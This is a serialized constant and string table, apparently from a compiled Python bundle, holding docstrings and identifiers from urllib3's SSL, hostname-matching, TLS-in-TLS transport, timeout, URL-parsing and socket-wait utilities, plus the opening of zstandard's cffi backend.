uReturn True for CPython 3.8.9+, 3.9.3+ or 3.10+ and PyPy 7.3.8+ where
    setting SSLContext.hostname_checks_common_name to False works.

    Outside of CPython and PyPy we don't know which implementations work
    or not so we conservatively use our hostname matching as we know that works
    on all implementations.

    https://github.com/urllib3/urllib3/issues/2192#issuecomment-821832963
    https://foss.heptapod.net/pypy/pypy/-/issues/3539
    astartswithTuOpenSSL lϡa_is_bpo_43522_fixedaSSLErrorTuNo certificate for the peer.areplaceTw:ualoweraHASHFUNC_MAPuFingerprint of invalid length: uagetuHash function implementation unavailable for fingerprint length: aunhexlifyaencodeadigestahmacacompare_digestuFingerprints did not match. Expected "u", got "ahexw"u
    Checks if given fingerprint matches the supplied certificate.

    :param cert:
        Certificate as bytes object.
    :param fingerprint:
        Fingerprint as string of hexdigits, can be interspersed by colons.
    aCERT_REQUIREDasslaCERT_u
    Resolves the argument to a numeric constant, which can be passed to
    the wrap_socket function/method from the ssl module.
    Defaults to :data:`ssl.CERT_REQUIRED`.
    If given a string it is assumed to be the name of the constant in the
    :mod:`ssl` module or its abbreviation.
    (So you can specify `REQUIRED` instead of `CERT_REQUIRED`.
    If it's neither `None` nor a string we assume it is already the numeric
    constant which can directly be passed to wrap_socket.
    aPROTOCOL_TLSaPROTOCOL_acastu
    like resolve_cert_reqs
    aSSLContextuCan't create an SSLContext object without an ssl moduleaPROTOCOL_TLS_CLIENTuCan't specify both 'ssl_version' and either 'ssl_minimum_version' or 'ssl_maximum_version'a_SSL_VERSION_TO_TLS_VERSIONaTLSVersionaMINIMUM_SUPPORTEDaMAXIMUM_SUPPORTEDawarningsawarnaDeprecationWarningTu'ssl_version' option is deprecated and will be removed in urllib3 v2.1.0. Instead use 'ssl_minimum_version'Tacategoryastacklevelaminimum_versionaTLSv1_2acontextamaximum_versionaset_cipherslaOP_NO_SSLv2aOP_NO_SSLv3aOP_NO_COMPRESSIONaOP_NO_TICKETaoptionsapost_handshake_authaIS_PYOPENSSLaverify_modeacheck_hostnameahostname_checks_common_nameakeylog_filenameaenvironTaSSLKEYLOGFILEuCreates and configures an :class:`ssl.SSLContext` instance for use with urllib3.

    :param ssl_version:
        The desired protocol version to use. This will default to
        PROTOCOL_SSLv23 which will negotiate the highest protocol that both
        the server and your installation of OpenSSL support.

        This parameter is deprecated instead use 'ssl_minimum_version'.
    :param ssl_minimum_version:
        The minimum version of TLS to be used. Use the 'ssl.TLSVersion' enum for specifying the value.
    :param ssl_maximum_version:
        The maximum version of TLS to be used. Use the 'ssl.TLSVersion' enum for specifying the value.
        Not recommended to set to anything other than 'ssl.TLSVersion.MAXIMUM_SUPPORTED' which is the
        default value.
    :param cert_reqs:
        Whether to require the certificate verification. This defaults to
        ``ssl.CERT_REQUIRED``.
    :param options:
        Specific OpenSSL options. These default to ``ssl.OP_NO_SSLv2``,
        ``ssl.OP_NO_SSLv3``, ``ssl.OP_NO_COMPRESSION``, and ``ssl.OP_NO_TICKET``.
    :param ciphers:
        Which cipher suites to allow the server to select. Defaults to either system configured
        ciphers if OpenSSL 1.1.1+, otherwise uses a secure default set of ciphers.
    :returns:
        Constructed SSLContext object with specified options
    :rtype: SSLContext
    acreate_urllib3_contextTaciphersaload_verify_locationsaload_default_certsa_is_key_file_encryptedTuClient private key is encrypted, password is requiredaload_cert_chainaset_alpn_protocolsaALPN_PROTOCOLSa_ssl_wrap_socket_implu
    All arguments except for server_hostname, ssl_context, tls_in_tls, ca_cert_data and
    ca_cert_dir have the same meaning as they do when using
    :func:`ssl.create_default_context`, :meth:`ssl.SSLContext.load_cert_chain`,
    :meth:`ssl.SSLContext.set_ciphers` and :meth:`ssl.SSLContext.wrap_socket`.

    :param server_hostname:
        When SNI is supported, the expected hostname of the certificate
    :param ssl_context:
        A pre-made :class:`SSLContext` object. If none is provided, one will
        be created using :func:`create_urllib3_context`.
    :param ciphers:
        A string of ciphers we wish the client to support.
    :param ca_cert_dir:
        A directory containing CA certificates in multiple separate files, as
        supported by OpenSSL's -CApath flag or the capath argument to
        SSLContext.load_verify_locations().
    :param key_password:
        Optional password if the keyfile is encrypted.
    :param ca_cert_data:
        Optional string containing CA certificates in PEM format suitable for
        passing as the cadata parameter to SSLContext.load_verify_locations()
    :param tls_in_tls:
        Use SSLTransport to wrap the existing socket.
    adecodeTaasciia_IPV4_REamatcha_BRACELESS_IPV6_ADDRZ_REuDetects whether the hostname given is an IPv4 or IPv6 address.
    Also detects IPv6 addresses with Zone IDs.

    :param str hostname: Hostname to examine.
    :return: True if the hostname is an IP address, False otherwise.
    a__enter__a__exit__aENCRYPTEDTnnnuDetects if a key file is encrypted or not.aSSLTransportaProxySchemeUnsupportedTuTLS in TLS requires support for the 'ssl' modulea_validate_ssl_context_for_tls_in_tlsawrap_socketTaserver_hostnamea__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aannotationsahashlibaosasocketasysatypingabinasciiTaunhexlifyaexceptionsTaProxySchemeUnsupportedaSSLErroraurlTa_BRACELESS_IPV6_ADDRZ_REa_IPV4_RElaHAS_NEVER_CHECK_COMMON_NAMEuhttp/1.1aTupleTOintppOstrOinta_TYPE_VERSION_INFOTTl amd5Tl(asha1Tl@asha256utoo many values to unpack (expected 2)Daimplementation_nameaversion_infoapypy_version_infoareturnastra_TYPE_VERSION_INFOu_TYPE_VERSION_INFO | NoneaboolDaopenssl_versionaopenssl_version_numberaimplementation_nameaversion_infoapypy_version_infoareturnastraintastra_TYPE_VERSION_INFOu_TYPE_VERSION_INFO | Noneaboola_is_has_never_check_common_name_reliableudict[int, int]TaCERT_REQUIREDaHAS_NEVER_CHECK_COMMON_NAMEaOP_NO_COMPRESSIONaOP_NO_TICKETaOPENSSL_VERSIONaOPENSSL_VERSION_NUMBERaPROTOCOL_TLSaPROTOCOL_TLS_CLIENTaOP_NO_SSLv2aOP_NO_SSLv3aSSLContextaTLSVersionaOPENSSL_VERSIONaOPENSSL_VERSION_NUMBERaPROTOCOL_SSLv23aimplementationanameapypy_version_infoTaTLSv1aTLSv1_1aTLSv1_2aattrassltransportTaSSLTransportlllllaUnionTa_TYPE_PEER_CERT_RET_DICTObytesna_TYPE_PEER_CERT_RETDacertafingerprintareturnubytes | NoneastraNoneaassert_fingerprintDacandidateareturnuNone | int | straVerifyModearesolve_cert_reqsDacandidateareturnuNone | int | straintaresolve_ssl_versionTnnnnnnDassl_versionacert_reqsaoptionsaciphersassl_minimum_versionassl_maximum_versionareturnuint | Noneuint | Noneuint | Noneustr | Noneuint | Noneuint | Noneussl.SSLContextaoverloadTQQQQQQQQQQQQDasockakeyfileacertfileacert_reqsaca_certsaserver_hostnameassl_versionaciphersassl_contextaca_cert_dirakey_passwordaca_cert_dataatls_in_tlsareturnusocket.socketustr | Noneustr | Noneuint | Noneustr | Noneustr | Noneuint | Noneustr | Noneussl.SSLContext | Noneustr | Noneustr | NoneuNone | str | bytesutyping.Literal[False]ussl.SSLSocketassl_wrap_socketDasockakeyfileacertfileacert_reqsaca_certsaserver_hostnameassl_versionaciphersassl_contextaca_cert_dirakey_passwordaca_cert_dataatls_in_tlsareturnusocket.socketustr | Noneustr | Noneuint | Noneustr | Noneustr | Noneuint | Noneustr | Noneussl.SSLContext | Noneustr | Noneustr | NoneuNone | str | bytesaboolussl.SSLSocket | SSLTransportTypeTnnnnnnnnnnnFDahostnameareturnustr | bytesaboolais_ipaddressDakey_fileareturnastraboolTnDasockassl_contextatls_in_tlsaserver_hostnameareturnusocket.socketussl.SSLContextaboolustr | Noneussl.SSLSocket | SSLTransportTypeuurllib3\util\ssl_.pyu<module urllib3.util.ssl_>Taimplementation_nameaversion_infoapypy_version_infoamajor_minoramicroTaopenssl_versionaopenssl_version_numberaimplementation_nameaversion_infoapypy_version_infoais_opensslais_openssl_issue_14579_fixedTakey_filewfalineTasockassl_contextatls_in_tlsaserver_hostnameTacertafingerprintadigest_lengthahashfuncafingerprint_bytesacert_digestTassl_versionacert_reqsaoptionsaciphersassl_minimum_versionassl_maximum_versionacontextasslkeylogfileTahostnameTacandidatearesT
asockakeyfileacertfileacert_reqsaca_certsaserver_hostnameassl_versionaciphersassl_contextaca_cert_dirakey_passwordaca_cert_dataatls_in_tlsTasockakeyfileacertfileacert_reqsaca_certsaserver_hostnameassl_versionaciphersassl_contextaca_cert_dirakey_passwordaca_cert_dataatls_in_tlsacontextweassl_sock.urllib3.util.ssl_match_hostnameYasplitTw.l:lnnacountTw*aCertificateErrorutoo many wildcards in certificate DNS name: alowerw*u[^.]+astartswithTuxn--areaescapeareplaceTu\*u[^.]*apatsacompileu\Au\.u\ZaIGNORECASEamatchuMatching according to RFC 6125, section 6.4.3

    http://tools.ietf.org/html/rfc6125#section-6.4.3
    aipaddressaip_addressarstripapackeduExact matching of IP addresses.

    RFC 9110 section 4.3.5: "A reference identity of IP-ID contains the decoded
    bytes of the IP address. An IP version 4 address is 4 octets, and an IP
    version 6 address is 16 octets. [...] A reference identity of type IP-ID
    matches if the address is identical to an iPAddress value of the
    subjectAltName extension of the certificate."
    uempty or no certificate, match_hostname needs a SSL socket or SSL context with either CERT_OPTIONAL or CERT_REQUIREDw%arfindTw%agetTasubjectAltNameTutoo many values to unpack (expected 2)aDNSahost_ipa_dnsname_matchahostnameadnsnamesuIP Addressa_ipaddress_matchTasubjectTacommonNameuhostname %r doesn't match either of %su, arepruhostname uu doesn't match Tuno appropriate subjectAltName fields were founduVerify that *cert* (in decoded format as returned by
    SSLSocket.getpeercert()) matches the *hostname*.  RFC 2818 and RFC 6125
    rules are followed, but IP addresses are not accepted for *hostname*.

    CertificateError is raised on failure. On success, the function
    returns nothing.
    uThe match_hostname() function from Python 3.5, essential when using SSL.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypingTaIPv4AddressaIPv6AddressaIPv4AddressaIPv6Addressu3.5.0.1a__version__TEValueErrora__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.util.ssl_match_hostnamea__module__a__qualname__a__orig_bases__TlDadnahostnameamax_wildcardsareturnutyping.Anyastraintutyping.Match[str] | None | boolDaipnameahost_ipareturnastruIPv4Address | IPv6AddressaboolTFDacertahostnameahostname_checks_common_nameareturnu_TYPE_PEER_CERT_RET_DICT | NoneastraboolaNoneamatch_hostnameuurllib3\util\ssl_match_hostname.pyu<module urllib3.util.ssl_match_hostname>T
adnahostnameamax_wildcardsapatsapartsaleftmostaremainderawildcardsafragapatTaipnameahost_ipaipTacertahostnameahostname_checks_common_nameasanakeyavalueahost_ipadnsnamesasub.urllib3.util.ssltransportawrap_bioaProxySchemeUnsupportedTuTLS in TLS requires SSLContext.wrap_bio() which isn't available on non-native SSLContextu
        Raises a ProxySchemeUnsupported if the provided ssl_context can't be used
        for TLS in TLS.

        The only requirement is that the ssl_context provides the 'wrap_bio'
        methods.
        asslaMemoryBIOaincomingaoutgoingasuppress_ragged_eofsasocketTaserver_hostnameasslobja_ssl_io_loopado_handshakeu
        Create an SSLTransport around socket using the provided ssl_context.
        acloseafilenoa_wrap_ssl_readlunon-zero flags not allowed in calls to recvunon-zero flags not allowed in calls to recv_intoareadunon-zero flags not allowed in calls to sendalla__enter__a__exit__acastTwBacountaselfasendTnnnunon-zero flags not allowed in calls to sendawriteSwwwbwruinvalid mode uu (only r, w, b allowed)wwwrwbaSocketIOa_io_refslqaDEFAULT_BUFFER_SIZEuunbuffered streams must be binaryaBufferedRWPairaBufferedReaderaBufferedWriteraTextIOWrapperamodeu
        Python's httpclient uses makefile and buffered io when reading HTTP
        messages and we need to support it.

        This is unfortunately a copy and paste of socket.py makefile with small
        changes to point to the socket directly.
        aunwrapagetpeercertaversionacipheraselected_alpn_protocolashared_ciphersacompressionasettimeoutagettimeouta_decref_socketiosaSSLErroraerrnoaSSL_ERROR_EOFashould_loopaarg1aarg2afuncaSSL_ERROR_WANT_READaSSL_ERROR_WANT_WRITEasendallarecvaSSL_BLOCKSIZEawrite_eofa_ReturnValuearetuPerforms an I/O loop between incoming/outgoing and the socket.a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsaioatypingaexceptionsTaProxySchemeUnsupportedlaUnionTObytearrayOmemoryviewa_WriteBufferaTypeVarTa_ReturnValueluurllib3.util.ssltransporta__module__u
    The SSLTransport wraps an existing socket and establishes an SSL connection.

    Contrary to Python's implementation of SSLSocket, it allows you to chain
    multiple TLS connections together. It's particularly useful if you need to
    implement TLS within TLS.

    The class supports most of the socket API operations.
    aSSLTransporta__qualname__Dassl_contextareturnussl.SSLContextaNonea_validate_ssl_context_for_tls_in_tlsuSSLTransport._validate_ssl_context_for_tls_in_tlsTntDasocketassl_contextaserver_hostnameasuppress_ragged_eofsareturnusocket.socketussl.SSLContextustr | NoneaboolaNonea__init__uSSLTransport.__init__DareturnaSelfuSSLTransport.__enter__Dw_areturnutyping.AnyaNoneuSSLTransport.__exit__DareturnaintuSSLTransport.filenoTlnDalenabufferareturnaintutyping.Any | Noneuint | bytesuSSLTransport.readTllDabuflenaflagsareturnaintpuint | bytesuSSLTransport.recvTnlDabufferanbytesaflagsareturna_WriteBufferuint | NoneaintuNone | int | bytesarecv_intouSSLTransport.recv_intoTlDadataaflagsareturnabytesaintaNoneuSSLTransport.sendallDadataaflagsareturnabytesaintpuSSLTransport.sendTnDaencodingaerrorsanewlinennnDamodeabufferingaencodingaerrorsanewlineareturnastruint | Noneustr | Noneustr | Noneustr | Noneutyping.BinaryIO | typing.TextIO | socket.SocketIOamakefileuSSLTransport.makefileDareturnaNoneuSSLTransport.unwrapuSSLTransport.closeaoverloadTQDabinary_formareturnutyping.Literal[False]u_TYPE_PEER_CERT_RET_DICT | NoneuSSLTransport.getpeercertDabinary_formareturnutyping.Literal[True]ubytes | NoneTFDabinary_formareturnaboola_TYPE_PEER_CERT_RETDareturnustr | NoneuSSLTransport.versionDareturnutuple[str, str, int] | NoneuSSLTransport.cipheruSSLTransport.selected_alpn_protocolDareturnulist[tuple[str, str, int]] | NoneuSSLTransport.shared_ciphersuSSLTransport.compressionDavalueareturnufloat | NoneaNoneuSSLTransport.settimeoutDareturnufloat | NoneuSSLTransport.gettimeoutuSSLTransport._decref_socketiosDalenabufferareturnaintubytearray | Noneuint | bytesuSSLTransport._wrap_ssl_readDafuncareturnutyping.Callable[[], None]aNoneuSSLTransport._ssl_io_loopDafuncaarg1areturnutyping.Callable[[bytes], int]abytesaintDafuncaarg1aarg2areturnutyping.Callable[[int, bytearray | None], bytes]aintubytearray | NoneabytesTnnDafuncaarg1aarg2areturnutyping.Callable[..., _ReturnValue]uNone | bytes | intubytearray | Nonea_ReturnValueuurllib3\util\ssltransport.pyu<module urllib3.util.ssltransport>Ta__class__TaselfTaselfw_Taselfasocketassl_contextaserver_hostnameasuppress_ragged_eofsTaselfafuncTaselfafuncaarg1Taselfafuncaarg1aarg2Taselfafuncaarg1aarg2ashould_looparetaerrnoweabufTassl_contextTaselfalenabufferweTaselfabinary_formT
aselfamodeabufferingaencodingaerrorsanewlineabufferawritingareadingabinaryarawmodearawatextTaselfalenabufferTaselfabuflenaflagsTaselfabufferanbytesaflagsTaselfadataaflagsTaselfadataaflagsacountaviewabyte_viewaamountwvTaselfavalue.urllib3.util.timeoutla_validate_timeoutaconnecta_connectareada_readatotala_start_connecta__name__uu(connect=u, read=u, total=w)a_DEFAULT_TIMEOUTagetdefaulttimeoutuTimeout cannot be a boolean value. It must be an int, float or None.TETypeErrorEValueErroruTimeout value %s was %s, but it must be an int, float or None.luAttempted to set %s timeout to %s, but the timeout cannot be set to a value less than or equal to 0.uCheck that a timeout attribute is valid.

        :param value: The timeout value to validate
        :param name: The name of the timeout attribute to validate. This is
            used to specify in error messages.
        :return: The validated and casted version of the given value.
        :raises ValueError: If it is a numeric value less than or equal to
            zero, or the type is not an integer, float, or None.
        aTimeoutTareadaconnectuCreate a new Timeout from a legacy timeout value.

        The timeout value used by httplib.py sets the same timeout on the
        connect(), and recv() socket requests. This creates a :class:`Timeout`
        object that sets the individual timeouts to the ``timeout`` value
        passed to this function.

        :param timeout: The legacy timeout value.
        :type timeout: integer, float, :attr:`urllib3.util.Timeout.DEFAULT_TIMEOUT`, or None
        :return: Timeout object
        :rtype: :class:`Timeout`
        TaconnectareadatotaluCreate a copy of the timeout object

        Timeout properties are stored per-pool but each request needs a fresh
        Timeout object to ensure each one has its own start/stop configured.

        :return: a copy of the timeout object
        :rtype: :class:`Timeout`
        aTimeoutStateErrorTuTimeout timer has already been started.atimeamonotonicuStart the timeout clock, used during a connect() attempt

        :raises urllib3.exceptions.TimeoutStateError: if you attempt
            to start a timer that has been started already.
        TuCan't get connect duration for timer that has not started.uGets the time elapsed since the call to :meth:`start_connect`.

        :return: Elapsed time in seconds.
        :rtype: float
        :raises urllib3.exceptions.TimeoutStateError: if you attempt
            to get duration for a timer that hasn't been started.
        aminuGet the value to use when setting a connection timeout.

        This will be a positive float or integer, the value None
        (never timeout), or the default system timeout.

        :return: Connect timeout.
        :rtype: int, float, :attr:`Timeout.DEFAULT_TIMEOUT` or None
        amaxaget_connect_durationaresolve_default_timeoutuGet the value for the read timeout.

        This assumes some time has elapsed in the connection timeout and
        computes the read timeout appropriately.

        If self.total is set, the read timeout is dependent on the amount of
        time taken by the connect timeout. If the connection time has not been
        established, a :exc:`~urllib3.exceptions.TimeoutStateError` will be
        raised.

        :return: Value to use for the read timeout.
        :rtype: int, float or None
        :raises urllib3.exceptions.TimeoutStateError: If :meth:`start_connect`
            has not yet been called on this object.
        a__doc__a__file__a__spec__aoriginahas_locationa__cached__a__annotations__aannotationsatypingaenumTaEnumaEnumasocketTagetdefaulttimeoutaexceptionsTaTimeoutStateErrorla__prepare__a_TYPE_DEFAULTa__getitem__u%s.__prepare__() must return a mapping, not %su<metaclass>uurllib3.util.timeouta__module__a__qualname__qatokena__orig_bases__uFinal[_TYPE_DEFAULT]aOptionalaUniona_TYPE_TIMEOUTuTimeout configuration.

    Timeouts can be defined as a default for a pool:

    .. code-block:: python

        import urllib3

        timeout = urllib3.util.Timeout(connect=2.0, read=7.0)

        http = urllib3.PoolManager(timeout=timeout)

        resp = http.request("GET", "https://example.com/")

        print(resp.status)

    Or per-request (which overrides the default for the pool):

    .. code-block:: python

       response = http.request("GET", "https://example.com/", timeout=Timeout(10))

    Timeouts can be disabled by setting all the parameters to ``None``:

    .. code-block:: python

       no_timeout = Timeout(connect=None, read=None)
       response = http.request("GET", "https://example.com/", timeout=no_timeout)


    :param total:
        This combines the connect and read timeouts into one; the read timeout
        will be set to the time leftover from the connect attempt. In the
        event that both a connect timeout and a total are specified, or a read
        timeout and a total are specified, the shorter timeout will be applied.

        Defaults to None.

    :type total: int, float, or None

    :param connect:
        The maximum amount of time (in seconds) to wait for a connection
        attempt to a server to succeed. Omitting the parameter will default the
        connect timeout to the system default, probably `the global default
        timeout in socket.py
        <http://hg.python.org/cpython/file/603b4d593758/Lib/socket.py#l535>`_.
        None will set an infinite timeout for connection attempts.

    :type connect: int, float, or None

    :param read:
        The maximum amount of time (in seconds) to wait between consecutive
        read operations for a response from the server. Omitting the parameter
        will default the read timeout to the system default, probably `the
        global default timeout in socket.py
        <http://hg.python.org/cpython/file/603b4d593758/Lib/socket.py#l535>`_.
        None will set an infinite timeout.

    :type read: int, float, or None

    .. note::

        Many factors can affect the total amount of time for urllib3 to return
        an HTTP response.

        For example, Python's DNS resolver does not obey the timeout specified
        on the socket. Other factors that can affect total request time include
        high CPU load, high swap, the program running at a low priority level,
        or other behaviors.

        In addition, the read and total timeouts only measure the time between
        read operations on the socket connecting the client and the server,
        not the total amount of time for the request to return a complete
        response. For most requests, the timeout is raised because the server
        has not sent the first byte in the specified time. This is not always
        the case; if a server streams one byte every fifteen seconds, a timeout
        of 20 seconds will not trigger, even though the request will take
        several minutes to complete.
    aDEFAULT_TIMEOUTDatotalaconnectareadareturna_TYPE_TIMEOUTppaNonea__init__uTimeout.__init__Dareturnastra__repr__uTimeout.__repr__a__str__Datimeoutareturna_TYPE_TIMEOUTufloat | NoneuTimeout.resolve_default_timeoutDavalueanameareturna_TYPE_TIMEOUTastra_TYPE_TIMEOUTuTimeout._validate_timeoutDatimeoutareturna_TYPE_TIMEOUTaTimeoutafrom_floatuTimeout.from_floatDareturnaTimeoutacloneuTimeout.cloneDareturnafloatastart_connectuTimeout.start_connectuTimeout.get_connect_durationDareturna_TYPE_TIMEOUTaconnect_timeoutuTimeout.connect_timeoutDareturnufloat | Nonearead_timeoutuTimeout.read_timeoutuurllib3\util\timeout.pyu<module urllib3.util.timeout>Ta__class__TaselfatotalaconnectareadTaselfTaclsavalueanameTaclsatimeoutTatimeout.urllib3.util.urleastartswithTw/w/alowera__class__a__new__apathahostuFor backwards-compatibility with urlparse. We're nice like that.aqueryw?uAbsolute path including the query string.aauthanetlocuw@u
        Authority component as defined in RFC 3986 3.2.
        This includes userinfo (auth), host and port.

        i.e.
            userinfo@host:port
        aportw:u
        Network location including host and port.

        If you need the equivalent of urllib.parse's ``netloc``,
        use the ``authority`` property instead.
        utoo many values to unpack (expected 7)u://w#u
        Convert self into a url

        This function should more or less round-trip with :func:`.parse_url`. The
        returned url may not be exactly the same as the url inputted to
        :func:`.parse_url`, but it should be equivalent by the RFC (e.g., urls
        with a blank port will have : removed).

        Example:

        .. code-block:: python

            import urllib3

            U = urllib3.util.parse_url("https://google.com/mail/")

            print(U.url)
            # "https://google.com/mail/"

            print( urllib3.util.Url("https", "username:password",
                                    "host.com", 80, "/path", "query", "fragment"
                                    ).url
                )
            # "https://username:password@host.com:80/path?query#fragment"
        aurlato_stra_PERCENT_REasubnu<lambda>u_encode_invalid_chars.<locals>.<lambda>utoo many values to unpack (expected 2)aencodeTuutf-8asurrogatepassacountTd%Blld%ladecodeaencoded_componentaextend:lnnazfillTlaupperuPercent-encodes a URI component without reapplying
    onto an already percent-encoded component.
    agroupTlasplitw.u..aoutputaendswithTTu/.u/..aappendTua_NORMALIZABLE_SCHEMESa_IPV6_ADDRZ_REamatcha_ZONE_ID_REasearchaspanTlTu%25u%25:lnn:lnna_encode_invalid_charsa_UNRESERVED_CHARSw%a_IPV4_REd.Tw.a_idna_encodeaasciiaisasciiaidnaaLocationParseErrorTuUnable to parse URL without the 'idna' moduleDastrictastd3_rulestpaIDNAErroruName 'u' is not a valid IDNA labelTaasciia_TARGET_REu is not a valid request URIagroupsa_PATH_CHARSa_QUERY_CHARSuPercent-encodes a request target so that there are no invalid characters

    Pre-condition for this function is that 'target' must start with '/'.
    If that is the case then _TARGET_RE will always produce a match.
    aUrla_SCHEME_REu//a_URI_REutoo many values to unpack (expected 5)arpartitionTw@utoo many values to unpack (expected 3)a_HOST_PORT_REa_USERINFO_CHARSTnnnla_normalize_hostaschemea_remove_path_dot_segmentsa_FRAGMENT_CHARSTEValueErrorEAttributeErroraport_intTaschemeaauthahostaportapathaqueryafragmentu
    Given a url, return a parsed :class:`.Url` namedtuple. Best-effort is
    performed to parse incomplete urls. Fields not provided will be None.
    This parser is RFC 3986 and RFC 6874 compliant.

    The parser logic and helper functions are based heavily on
    work done in the ``rfc3986`` module.

    :param str url: URL to parse into a :class:`.Url` namedtuple.

    Partly backwards-compatible with :mod:`urllib.parse`.

    Example:

    .. code-block:: python

        import urllib3

        print( urllib3.util.parse_url('http://google.com/mail/'))
        # Url(scheme='http', host='google.com', port=None, path='/mail/', ...)

        print( urllib3.util.parse_url('google.com:80'))
        # Url(scheme=None, host='google.com', port=80, path=None, ...)

        print( urllib3.util.parse_url('/foo?bar'))
        # Url(scheme=None, host=None, port=None, path='/foo', query='bar', ...)
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsareatypingaexceptionsTaLocationParseErrorlautilTato_strTahttpahttpsnacompileTu%[a-fA-F0-9]{2}Tu^(?:[a-zA-Z][a-zA-Z0-9+-]*:|/)u^(?:([a-zA-Z][a-zA-Z0-9+.-]*):)?(?://([^\\/?#]*))?([^?#]*)(?:\?([^#]*))?(?:#(.*))?$aUNICODEaDOTALLu(?:[0-9]{1,3}\.){3}[0-9]{1,3}a_IPV4_PATu[0-9A-Fa-f]{1,4}a_HEX_PATu(?:{hex}:{hex}|{ipv4})Tahexaipv4a_LS32_PATahexals32a_subsLu(?:%(hex)s:){6}%(ls32)su::(?:%(hex)s:){5}%(ls32)su(?:%(hex)s)?::(?:%(hex)s:){4}%(ls32)su(?:(?:%(hex)s:)?%(hex)s)?::(?:%(hex)s:){3}%(ls32)su(?:(?:%(hex)s:){0,2}%(hex)s)?::(?:%(hex)s:){2}%(ls32)su(?:(?:%(hex)s:){0,3}%(hex)s)?::%(hex)s:%(ls32)su(?:(?:%(hex)s:){0,4}%(hex)s)?::%(ls32)su(?:(?:%(hex)s:){0,5}%(hex)s)?::%(hex)su(?:(?:%(hex)s:){0,6}%(hex)s)?::a_variationsuABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789._\-~a_UNRESERVED_PATu(?:w|w)a_IPV6_PATu(?:%25|%)(?:[u]|%[a-fA-F0-9]{2})+a_ZONE_ID_PATu\[u)?\]a_IPV6_ADDRZ_PATu(?:[^\[\]%:/?#]|%[a-fA-F0-9]{2})*a_REG_NAME_PATTu^(/[^?#]*)(?:\?([^#]*))?(?:#.*)?$w^w$a_IPV6_RE:lqna_BRACELESS_IPV6_ADDRZ_REw(u)\]$u^(%s|%s|%s)(?::0*?(|0|[1-9][0-9]{0,4}))?$a_HOST_PORT_PATSBwSwKwQwUwAwrwzw9wMwYwLwBw5waw8wvwowWwjw.w_wCw~w7wfwGwxwgwNwkw0w4wDwRwpwOwdwywJwXwnwEwHwbw2wFwmw6w1wIwTwZw3w-wqwuwswhwtwiwcwVwewwwlwPSw'w;w+w,w)w(w!w=w*w&w$a_SUB_DELIM_CHARSSw:Sw/w@Sw?aNamedTupleaOptionalafragmenta__prepare__a__getitem__u%s.__prepare__() must return a mapping, not %sa__name__u<metaclass>uurllib3.util.urla__module__u
    Data structure for representing an HTTP URL. Used as a return value for
    :func:`parse_url`. Both the scheme and host are normalized as they are
    both case-insensitive according to RFC 3986.
    a__qualname__TnnnnnnnDaschemeaauthahostaportapathaqueryafragmentustr | Noneustr | Noneustr | Noneuint | Noneustr | Noneustr | Noneustr | NoneuUrl.__new__apropertyDareturnustr | NoneahostnameuUrl.hostnameDareturnastrarequest_uriuUrl.request_uriaauthorityuUrl.authorityuUrl.netlocuUrl.urla__str__uUrl.__str__a__orig_bases__aoverloadDacomponentaallowed_charsareturnastrutyping.Container[str]astrDacomponentaallowed_charsareturnaNoneutyping.Container[str]aNoneDacomponentaallowed_charsareturnustr | Noneutyping.Container[str]ustr | NoneDapathareturnastrpDahostaschemeareturnaNoneustr | NoneaNoneDahostaschemeareturnastrustr | NoneastrDahostaschemeareturnustr | Noneustr | Noneustr | NoneDanameareturnastrabytesDatargetareturnastrpa_encode_targetDaurlareturnastraUrlaparse_urluurllib3\util\url.pyTamatchu<module urllib3.util.url>Ta__class__Taclsaschemeaauthahostaportapathaqueryafragmenta__class__TaselfTacomponentaallowed_charsTacomponentaallowed_charsapercent_encodingsauri_bytesais_percent_encodedaencoded_componentwiabyteabyte_ordTatargetamatchapathaqueryaencoded_targetTanameaidnaTahostaschemeTahostaschemeais_ipv6amatchastartaendazone_idTapathasegmentsaoutputasegmentTaselfauserinfoanetlocTaurlaschemeaauthorityaauthahostaportaport_intapathaqueryafragmentasource_urlanormalize_uriw_ahost_portweTaselfauriTaselfaschemeaauthahostaportapathaqueryafragmentaurl.urllib3.util.utilI unot expecting type a__name__uaencodeuutf-8astrictTaerrorsadecodea__traceback__awith_tracebacka__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsatypingaTracebackTypelTnnDwxaencodingaerrorsareturnustr | bytesustr | Noneustr | Noneabytesato_bytesDwxaencodingaerrorsareturnustr | bytesustr | Noneustr | Noneastrato_strTnDatpavalueatbareturnutype[BaseException] | NoneaBaseExceptionuTracebackType | Noneutyping.NoReturnareraiseuurllib3\util\util.pyu<module urllib3.util.util>TatpavalueatbTwxaencodingaerrors.urllib3.util.wait1umust specify at least one of read=True, write=Trueapartialaselectutoo many values to unpack (expected 3)laPOLLINaPOLLOUTapollaregisterDwtareturnufloat | Noneulist[tuple[int, int]]ado_pollupoll_wait_for_socket.<locals>.do_polllapoll_objTlTEAttributeErrorEOSErrora_have_working_pollapoll_wait_for_socketawait_for_socketaselect_wait_for_socketTareadatimeoutuWaits for reading to be available on a given socket.
    Returns True if the socket is readable, or False if the timeout expired.
    TawriteatimeoutuWaits for writing to be available on a given socket.
    Returns True if the socket is readable, or False if the timeout expired.
    a__doc__a__file__a__spec__aoriginahas_locationa__cached__aannotationsasocketawait_for_readawait_for_writea__all__TFpnDasockareadawriteatimeoutareturnusocket.socketaboolpufloat | NoneaboolDareturnaboolTnDasockatimeoutareturnusocket.socketufloat | Noneabooluurllib3\util\wait.pyu<module urllib3.util.wait>Tapoll_objTwtapoll_objTasockareadawriteatimeoutamaskapoll_objado_pollT
asockareadawriteatimeoutarcheckawcheckafnarreadyawreadyaxreadyTasockatimeoutTasockareadawriteatimeoutu.zstandard.backend_cffiTKacpu_countlasysconfTaSC_NPROCESSORS_ONLNTEAttributeErrorEValueErroruThe byte offset of this segment within its parent buffer.uObtain the length of the segment, in bytes.uObtain bytes copy of this segment.uTotal sizein bytes of the backing buffer.uObtains a segment within the buffer.

        The returned object references memory within this buffer.

        :param i:
           Integer index of segment to retrieve.
        :return:
           :py:class:`BufferSegment`
        uObtain the array of ``(offset, length)`` segments in the buffer.

        :return:
           :py:class:`BufferSegments`
